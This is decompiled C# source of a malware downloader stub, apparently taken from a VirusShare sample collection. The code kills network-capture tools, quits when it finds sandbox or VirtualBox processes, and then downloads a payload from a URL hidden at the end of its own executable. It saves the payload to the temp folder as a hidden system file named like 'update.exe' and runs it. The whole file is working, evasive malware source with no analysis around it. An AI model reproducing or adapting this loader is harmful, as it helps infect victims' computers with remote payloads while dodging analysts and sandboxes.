// Decompiled with JetBrains decompiler
// Type: Stub.Program
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BC1521CF-4E9B-49AB-B1D2-143C604B2BDE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Constructor.MSIL.Downloader.d-23209278814c35989d6344db28dfe320e06ed79ab828ac1f8cc495ef0d57c073.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace Stub
{
  internal class Program
  {
    public static Random R = new Random();
    public static string Rand1 = Program.R.Next(100000).ToString() + "update.exe";

    [STAThread]
    private static void Main(string[] args)
    {
      StreamReader streamReader = new StreamReader(Application.ExecutablePath);
      BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream);
      byte[] bytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
      binaryReader.Close();
      streamReader.Close();
      string str = new ASCIIEncoding().GetString(bytes);
      string address = str.Substring(str.Length - 100).Split('_')[0];
label_1:
      Process[] processesByName1 = Process.GetProcessesByName("wireshark");
      Process[] processesByName2 = Process.GetProcessesByName("EtherD");
      Process[] processesByName3 = Process.GetProcessesByName("joeboxserver");
      Process[] processesByName4 = Process.GetProcessesByName("joeboxcontrol");
      Process[] processesByName5 = Process.GetProcessesByName("VBoxService");
      Process[] processesByName6 = Process.GetProcessesByName("dumpcap");
      if (processesByName1.Length == 1)
      {
        foreach (Process process in Process.GetProcessesByName("wireshark"))
          process.Kill();
        goto label_1;
      }
      else if (processesByName2.Length == 1)
      {
        foreach (Process process in Process.GetProcessesByName("EtherD"))
          process.Kill();
        goto label_1;
      }
      else if (processesByName3.Length == 1)
        Application.Exit();
      else if (processesByName4.Length == 1)
        Application.Exit();
      else if (processesByName5.Length == 1)
        Application.Exit();
      else if (processesByName6.Length == 1)
      {
        foreach (Process process in Process.GetProcessesByName("dumpcap"))
          process.Kill();
        goto label_1;
      }
      else
      {
        new WebClient().DownloadFile(address, Path.GetTempPath() + Program.Rand1);
        System.IO.File.SetAttributes(Path.GetTempPath() + Program.Rand1, System.IO.File.GetAttributes(Path.GetTempPath() + Program.Rand1) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
        Process.Start(new ProcessStartInfo()
        {
          FileName = Program.Rand1,
          WorkingDirectory = Path.GetTempPath()
        });
        Application.Exit();
      }
    }
  }
}
